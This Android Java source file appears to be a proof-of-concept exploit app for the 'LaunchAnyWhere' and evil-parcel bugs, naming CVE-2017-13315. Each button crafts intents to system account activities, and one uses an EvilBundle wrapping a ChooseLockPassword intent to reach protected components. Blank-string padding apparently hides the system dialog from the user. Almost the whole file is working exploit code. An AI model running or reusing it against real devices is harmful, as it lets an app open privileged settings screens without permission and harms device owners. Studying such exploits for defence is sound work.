package com.example.launchanywherebyevilparcel1999;

import androidx.appcompat.app.AppCompatActivity;

import android.accounts.Account;
import android.annotation.SuppressLint;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Parcel;
import android.os.WorkSource;
import android.util.Log;
import android.view.View;
import android.widget.Button;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        final Button button = findViewById(R.id.button_old);
        button.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                // Code here executes on main thread after user presses button
                //针对android12以下有效
                Intent intent = new Intent();
                intent.setComponent(new ComponentName(
                        "com.android.settings",
                        "com.android.settings.accounts.AddAccountSettings"));
                intent.setAction(Intent.ACTION_RUN);
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                String authTypes[] = {"com.example.launchanywherebyevilparcel1999"};

                intent.putExtra("account_types", authTypes);
                MainActivity.this.startActivity(intent);


            }
        });

        final Button button_new = findViewById(R.id.button_new);
        button_new.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                // Code here executes on main thread after user presses button
                //针对android全版本有效
                Intent intent2 = new Intent();
                intent2.setComponent(new ComponentName("android", "android.accounts.ChooseTypeAndAccountActivity"));
                intent2.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK | Intent.FLAG_ACTIVITY_NEW_TASK);

                String typeName = "com.example.launchanywherebyevilparcel1999";
                ArrayList arrayList = new ArrayList();
                arrayList.add(new Account(typeName, typeName + "unknown"));
                intent2.putExtra("allowableAccounts", arrayList);
                intent2.putExtra("allowableAccountTypes", new String[]{typeName});
                Bundle bundle = new Bundle();
                bundle.putBoolean("alivePullStartUp", true);
                intent2.putExtra("addAccountOptions", bundle);
                intent2.putExtra("descriptionTextOverride", getBlankString());
                MainActivity.this.startActivity(intent2);
            }
        });
        final Button button_test = findViewById(R.id.button_test);
        button_test.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                // Code here executes on main thread after user presses button

                Intent intent3 = new Intent();
                intent3.setAction(Intent.ACTION_RUN);
                intent3.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                intent3.setComponent(new ComponentName("com.android.settings", "com.android.settings.password.ChooseLockPassword"));
                intent3.putExtra(Intent.EXTRA_USER, -2);
                //MainActivity.this.startActivity(intent3);

                Bundle evil = new EvilBundle(getApplicationContext()).debugForWorkSource(intent3);
                //Bundle evil = new EvilBundle((getApplicationContext())).makeBundle(intent3,"CVE-2017-13315");

                Parcel data = Parcel.obtain();
                evil.writeToParcel(data,0);
                try {
                    byte[] raw = data.marshall();//序列化为byte[]
                    FileOutputStream fos = null;
                    fos  = openFileOutput("marshall.pcl", Context.MODE_PRIVATE);
                    fos.write(raw);
                    fos.close();

                } catch (FileNotFoundException e){
                    e.printStackTrace();
                } catch (IOException e) {
                    e.printStackTrace();
                }



                Intent intent = new Intent();
                intent.putExtra("data", evil);
                intent.setClass(getApplicationContext(),FirstActivity.class);
                startActivity(intent);
            }
        });

    }

    private String getBlankString() {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < 256; i++) {
            sb.append(" ");
        }
        for (int i2 = 0; i2 < 256; i2++) {
            if (Build.VERSION.SDK_INT >= 19) {
                sb.append(System.lineSeparator());
            }
        }
        return sb.toString();
    }



}